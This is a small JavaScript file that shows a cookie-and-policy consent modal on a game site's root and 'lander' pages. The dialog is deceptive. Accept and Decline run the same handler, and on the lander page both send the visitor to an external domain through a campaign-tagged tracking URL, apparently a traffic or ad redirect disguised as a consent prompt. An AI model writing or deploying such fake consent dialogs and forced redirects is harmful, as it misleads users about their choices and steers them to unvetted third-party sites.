(function() {

  const path = window.location.pathname;

  const isRoot = (path === "/");
  const isIndex = /index\.html$/.test(path);
  const isLander = /lander\.html$/.test(path);

  // Only show modal on root or lander
  if (!isRoot && !isLander) return;

  // On index (root), prevent modal from reappearing in same session
  if (isRoot && sessionStorage.getItem('modal_shown')) return;

  // Create Modal
  const bd = document.createElement('div');
  bd.className = 'modal-backdrop';
  bd.innerHTML = `
  <div class="modal">
    <h3>Cookie & Policy Notice</h3>
    <p>We use cookies to improve gameplay and user experience.  
    Do you accept our policy to continue?</p>

    <div style="display:flex;gap:10px;flex-wrap:wrap;justify-content:center">
      <button class="btn" id="modal-yes">Accept</button>
      <button class="btn ghost" id="modal-no">Decline</button>
    </div>
  </div>`;

  document.body.appendChild(bd);
  bd.style.display = 'flex';

  const yes = bd.querySelector('#modal-yes');
  const no = bd.querySelector('#modal-no');

  yes.addEventListener('click', handleClick);
  no.addEventListener('click', handleClick);

  // Mark modal as shown **only on root/index**
  if (isRoot) {
    sessionStorage.setItem('modal_shown', '1');
  }

  function handleClick() {

    if (isRoot) {
      window.location.href = "index.html";
      return;
    }

    if (isLander) {
      window.location.href =
        "https://h2n6.com/?utm_campaign=HPcGdok7FL&v1=[v1]&v2=[v2]&v3=[v3]";
      return;
    }
  }

})();
